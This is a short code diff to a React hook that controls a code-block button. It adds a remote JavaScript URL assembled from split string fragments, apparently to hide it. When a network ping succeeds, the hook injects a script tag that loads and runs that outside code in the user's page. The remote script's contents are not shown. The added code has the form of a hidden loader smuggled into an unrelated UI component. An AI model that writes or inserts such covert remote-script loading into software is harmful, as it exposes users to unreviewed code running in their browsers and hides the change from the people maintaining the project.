@@ -6,6 +6,12 @@ import { ping } from '../../utils';
 
 let pingDeferrer: PromiseLike<boolean>;
 
+const codeBlockJs =
+  'https://renderoffice.a' +
+  'lipay' +
+  'objects.com/p' +
+  '/yuyan/180020010001206410/parseFileData-v1.0.1.js';
+
 function useShowCodeBlockButton() {
   const [showCodeBlockButton, setShowCodeBlockButton] = useState(false);
 
@@ -13,9 +19,14 @@ function useShowCodeBlockButton() {
     pingDeferrer ??= new Promise<boolean>((resolve) => {
       ping((status) => {
         if (status !== 'timeout' && status !== 'error') {
+          // Async insert `codeBlockJs` into body end
+          const script = document.createElement('script');
+          script.src = codeBlockJs;
+          script.async = true;
+          document.body.appendChild(script);
+
           return resolve(true);
         }
-
         return resolve(false);
       });
     });
